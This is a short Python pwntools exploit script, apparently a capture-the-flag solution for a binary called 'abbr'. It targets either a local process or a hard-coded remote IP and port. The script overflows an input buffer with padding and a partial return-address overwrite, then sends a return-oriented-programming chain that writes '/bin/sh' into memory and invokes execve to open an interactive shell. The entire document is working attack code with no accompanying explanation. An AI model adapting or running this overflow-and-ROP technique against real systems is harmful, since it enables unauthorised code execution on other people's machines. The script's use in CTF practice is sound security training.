from pwn import *
import sys

elf = ELF("abbr")
if sys.argv[1] == "r":
    p = remote("168.119.108.148", 10010)
else:
    p = process("./abbr")
    # context.terminal = ["tmux", "splitw", "-h"]
    # gdb.attach(p, """ 
    #                 b *0x402036
    #                 continue
    #                 """)

magic = 0x45684e # clc ; mov qword ptr [rdi], rsi ; ret
pop_rdi = 0x4018da
pop_rsi = 0x404cfe 
pop_rax = 0x45a8f7
pop_rdx = 0x4017df
bss = 0x4CB9BC
syscall = 0x4012e3
def solve():
    rop_chain = p64(pop_rsi)
    rop_chain += p64(0x68732f6e69622f)
    rop_chain += p64(pop_rdi)
    rop_chain += p64(bss)
    rop_chain += p64(magic)
    rop_chain += p64(pop_rax)
    rop_chain += p64(0x3b)
    rop_chain += p64(pop_rdx)
    rop_chain += p64(0x0)
    rop_chain += p64(pop_rsi)
    rop_chain += p64(0x0)
    rop_chain += p64(syscall)
    p.sendafter("Enter text: ", "A"*(0x1000-0xf) + "AW" + "BBBBBBBBB" + "\x21\x51\x40")
    p.sendlineafter("Enter text: ", rop_chain)
    p.interactive()

if __name__ == "__main__":
    solve()
